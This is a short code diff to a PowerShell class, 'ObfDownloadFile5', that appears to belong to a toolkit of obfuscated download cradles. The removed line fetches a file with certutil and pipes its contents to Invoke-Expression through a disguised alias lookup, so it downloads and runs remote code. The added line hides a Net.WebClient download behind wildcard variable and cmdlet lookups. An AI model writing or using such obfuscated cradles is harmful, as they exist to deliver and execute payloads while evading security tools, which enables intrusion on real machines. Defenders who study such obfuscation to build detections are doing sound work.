@@ -1,8 +1,8 @@
 Class ObfDownloadFile5 {
 
     static Execute ([String]$url, [String]$path) {
-        SV z $path;Set-Item Variable:\5c $url;$NULL=certutil.exe /urlcache -f (GCI Variable:5c).Value (DIR Variable:z).Value;(-Join((CAT -En 3 (DIR Variable:z).Value)|ForEach-Object{[Char](ChildItem Variable:/_).Value}))|.(Get-Alias IE*)
-
+        #CLI:  Disk\PsWebFile\Cmdlet\3
+        ls pena*;(.(GI Variable:\*xec*t).Value.InvokeCommand.GetCmdlets('N*ct')Net.WebClient).DownloadFile($url,$path)
     }
 
 }
